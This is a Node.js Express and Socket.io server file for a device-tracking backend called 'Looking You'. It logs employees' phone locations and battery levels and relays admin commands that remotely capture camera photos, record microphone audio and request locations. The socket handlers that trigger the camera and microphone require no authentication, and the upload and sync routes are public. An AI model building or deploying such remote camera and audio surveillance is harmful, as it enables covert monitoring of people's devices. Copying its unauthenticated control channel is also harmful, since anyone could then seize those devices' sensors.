const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
require('dotenv').config();

const { connectDB } = require('./src/config/database');
const uploadRoutes = require('./src/routes/upload.routes');
const historyRoutes = require('./src/routes/history.routes');
const authRoutes = require('./src/routes/auth.routes');
const syncRoutes = require('./src/routes/sync.routes');
const authMiddleware = require('./src/middlewares/auth.middleware');

const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  path: '/socket.io/',
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

// Share io with other routes
app.set('socketio', io);

// Middlewares
app.use(cors());
app.use(express.json());

// Logger for all requests
app.use((req, res, next) => {
  console.log(`🌐 [${new Date().toLocaleTimeString()}] ${req.method} ${req.url} from ${req.ip}`);
  next();
});

app.use('/api/auth', authRoutes); // Auth routes (login/seed)
app.use('/api/sync', syncRoutes); // Public sync route (device sends id)
app.use('/upload', uploadRoutes); // Register upload routes
app.use('/api/history', authMiddleware, historyRoutes); // Protect history routes with JWT
app.use('/uploads', express.static('uploads')); // Serve uploaded files statically
app.use(express.static(path.join(__dirname, 'public'))); // Serve assets (CSS/JS)

// Admin Dashboard Route
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Login Page Route
app.get('/login', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

// Add a simple route to verify connectivity
app.get('/', (req, res) => {
  res.send('🚀 Looking You Backend is ONLINE and READY for Socket connections!');
});

const Device = require('./src/models/device.model');
const TrackingLog = require('./src/models/tracking.model');

// Socket.io Connection
io.on('connection', (socket) => {
  console.log('🔌 A device/admin connected:', socket.id);

  // Listen for device registration
  socket.on('register_device', async (data) => {
    console.log('📱 Device registering:', data);
    try {
      // Find or create device in MySQL
      const [device, created] = await Device.findOrCreate({
        where: { deviceId: data.deviceId },
        defaults: { employeeName: data.employeeName || 'Unknown' }
      });
      
      await device.update({ isOnline: true, lastSeen: new Date() });
      socket.join(data.deviceId);
      console.log(`✅ Device ${data.deviceId} is now online`);
    } catch (err) {
      console.error('❌ Registration Error:', err);
    }
  });

  // Listen for location updates
  socket.on('update_location', async (data) => {
    console.log('📍 Location Update:', data);
    try {
      const device = await Device.findOne({ where: { deviceId: data.deviceId } });
      if (device) {
        await TrackingLog.create({
          deviceId: device.id,
          latitude: data.latitude,
          longitude: data.longitude,
          batteryLevel: data.batteryLevel,
          isCharging: data.isCharging,
          logType: 'location'
        });
        await device.update({ lastSeen: new Date() });
      }
    } catch (err) {
      console.error('❌ Location Update Error:', err);
    }
  });

  socket.on('trigger_photo', (data) => {
    console.log('📸 Admin requested a photo capture for device:', data.deviceId);
    io.to(data.deviceId).emit('take_photo', { camera: data.camera || 'front' });
  });

  socket.on('toggle_tracking', (data) => {
    console.log(`📡 Admin requested to ${data.action} tracking for device:`, data.deviceId);
    io.to(data.deviceId).emit('remote_control', { action: data.action });
  });

  socket.on('trigger_audio', (data) => {
    console.log(`🎙️ Admin requested audio recording for device:`, data.deviceId, `Duration: ${data.duration}s`);
    io.to(data.deviceId).emit('trigger_audio', { duration: data.duration || 30 });
  });

  socket.on('request_current_location', (data) => {
    console.log(`📍 Admin requested ONE-TIME location for device:`, data.deviceId);
    io.to(data.deviceId).emit('get_location_once');
  });

  // Dashboard requests list of online devices
  socket.on('list_devices', async () => {
    try {
      const devices = await Device.findAll({ where: { isOnline: true } });
      socket.emit('devices_data', devices);
    } catch (err) {
      console.error('❌ Error fetching devices:', err);
    }
  });

  socket.on('disconnect', () => {
    console.log('❌ User disconnected');
  });
});

// Start Server
const PORT = process.env.PORT || 5000;

const start = async () => {
  await connectDB(); // Connect to MySQL
  server.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server running on http://0.0.0.0:${PORT}`);
  });
};

start();
